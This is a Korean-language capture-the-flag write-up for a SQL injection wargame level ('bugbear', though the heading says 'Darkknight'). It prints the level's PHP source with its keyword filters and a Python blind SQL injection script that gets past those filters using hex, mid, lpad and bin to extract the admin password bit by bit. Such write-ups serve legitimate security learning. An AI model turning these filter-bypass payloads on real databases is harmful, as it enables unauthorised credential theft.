## Darkknight Write-up

### 문제
``` php
<?php  
include "./config.php";  
login_chk();  
dbconnect();  
if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~");  
if(preg_match('/\'/i', $_GET[pw])) exit("HeHe");  
if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe");  
$query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}";  
echo "<hr>query : <strong>{$query}</strong><hr><br>";  
$result = @mysql_fetch_array(mysql_query($query));  
if($result['id']) echo "<h2>Hello {$result[id]}</h2>";  
  
$_GET[pw] = addslashes($_GET[pw]);  
$query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'";  
$result = @mysql_fetch_array(mysql_query($query));  
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear");  
highlight_file(__FILE__);  
?>
```

### Exploit 코드
``` python
import requests

def req(a) :
    url = 'https://los.rubiya.kr/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php'
    cookies = {'PHPSESSID' : 'My PHPSESSID'}
    params = {}
    params['no'] = a

    res = requests.get(url, cookies=cookies, params=params)

    if "Hello admin" in res.text :
        return True
    else :
        return False

for i in range(20) :
    a = "0||hex(mid(id,1,1))<62&&length(pw)>" + str(i)
    if not req(a) :
        length = i
        break
print("Key length is %d" % length)

flag = ''
for i in range(length) :
    binary = ''
    for j in range(8) :
        a = "0||hex(mid(id,1,1))<62&&mid(lpad(bin(hex(mid(pw,"+str(i+1)+",1))),8,0),"+str(j+1)+",1)<1"
        if req(a) :
            binary += '0'
        else :
            binary += '1'
    binary = str(int(binary, 2))
    binary = chr(int(binary, 16))
    flag += binary
    print("[%d] %s" % (i+1, flag))

print("Flag is %s" % flag)
```
admin의 pw를 알아내야 문제가 풀린다.  
이번 문제에서는 `substr` `ascii` `or` `like` `0x` 가 필터링 되어 있다.
ascii와 or이 막혀 있어 ord도 사용 못한다.
따라서 hex 값으로 변경해서 비교했다.